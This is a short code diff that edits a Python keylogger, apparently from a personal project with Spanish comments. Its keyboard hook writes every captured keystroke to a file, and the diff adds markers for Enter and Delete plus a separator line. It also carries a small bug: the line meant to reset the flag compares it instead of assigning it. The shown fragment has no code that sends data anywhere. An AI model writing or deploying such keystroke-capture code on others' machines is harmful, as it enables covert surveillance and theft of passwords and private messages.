@@ -63,6 +63,7 @@ def OnKeyboardEvent(event):
     """
     global count
     count += 1
+    salto = 0
     #presiona CTRL+E para salir
     if event.Ascii==5:
         sys.exit(0)
@@ -86,15 +87,23 @@ def OnKeyboardEvent(event):
         keylogs=chr(event.Ascii)
  
         #si se presiona ENTER
-        if event.Ascii==13:
-            keylogs='\n'
+        if event.Ascii == 13:
+            keylogs = '\n'
+            salto = 1
  
         #si se preciona ESPACIO 
-        if event.Ascii==32:
-            keylogs=' '
+        if event.Ascii == 32:
+            keylogs = ' '
+        
+        if event.Ascii == 127:
+            keylogs = '(DELETE)'
  
         buffer+=keylogs
         f.write(buffer)
+        if(salto == 1):
+            f.write("#####################################################################################")
+            f.write('\n')
+            salto == 0
         f.close()
  
          
